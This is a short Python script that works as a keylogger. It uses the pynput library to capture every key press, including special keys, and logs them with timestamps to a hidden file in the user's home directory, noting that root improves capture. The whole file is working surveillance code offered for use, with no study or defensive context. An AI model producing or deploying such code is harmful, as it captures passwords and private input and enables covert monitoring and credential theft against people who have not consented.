#!/usr/bin/env python3

from pynput import keyboard
import os
import logging

# Set log file path
log_dir = os.path.expanduser("~/.keylogs")
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

log_file = os.path.join(log_dir, "keylog.txt")

logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def main():
    print(f"[+] Logging keys to: {log_file}")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] Warning: Some keystrokes may not be captured without root.")
    main()
